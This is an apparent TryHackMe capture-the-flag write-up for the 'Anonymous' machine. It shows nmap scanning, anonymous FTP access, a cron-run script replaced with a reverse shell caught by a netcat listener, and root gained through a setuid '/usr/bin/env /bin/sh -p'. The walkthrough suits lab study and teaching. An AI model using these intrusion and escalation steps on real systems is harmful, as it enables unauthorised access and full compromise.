# Machine-Anonymous-THM-Report
# Compromise Report: Anonymous Machine

## 1. General Information
- **IP**: `<ip>`
- **Difficulty Level**: Medium

## 2. Scanning and Enumeration

### Port Scanning with Nmap
A port scan was performed using the following command:

```bash
nmap --open -T5 -sV -n <ip> -vvv
```

Scan Result:

```
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

Detected Services:
- **Puerto 21**: FTP (vsftpd 2.0.8 o posterior)
- **Puerto 22**: SSH (OpenSSH 7.6p1)
- **Puertos 139 y 445**: Samba (Samba smbd 3.X - 4.X)

### FTP Enumeration
We detected that the FTP port is open for **anonymous** access. We connected with the default credentials and discovered a folder named `scripts` with write and execute permissions.

```plaintext
ftp> ls
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
```

Upon entering the `scripts` folder, we found a file named `clean.sh`, which is executed by cron. We took advantage of the write permissions and uploaded a modified version of the script containing a reverse shell.

## 3. Exploitation: Reverse Shell
We uploaded our own `clean.sh` and set up a listener with netcat:

```bash
nc -lvnp 4444
```

Connection established:

```plaintext
listening on [any] 4444 ...
connect to [10.23.30.52] from (UNKNOWN) [<ip>] 55664
bash: cannot set terminal process group (1398): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$
```

We have gained access to the machine with the user **namelessone**.

### Access to the Flag `user.txt`
In the folder of the user `namelessone`, we found the flag `user.txt`:

```bash
namelessone@anonymous:~$ ls
pics  user.txt
```

## 4. Privilege Escalation

To enumerate possible attack vectors for privilege escalation, we set up a Python server and transferred `linpeas`.

We found a file with interesting permissions:


```plaintext
-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env
```

By executing the following command, we escalated to `root`:

```bash
namelessone@anonymous:/tmp$ /usr/bin/env /bin/sh -p
```

### Explanation of the Escalation
The command `/usr/bin/env /bin/sh -p` executes a new instance of the shell (`sh`) with the setuid attribute (setuid permissions) of the `env` file, which means that the process runs with the privileges of the file's owner, which in this case is `root`. This allows the user `namelessone` to gain full access to the system as `root`.

```bash
# whoami
root
```
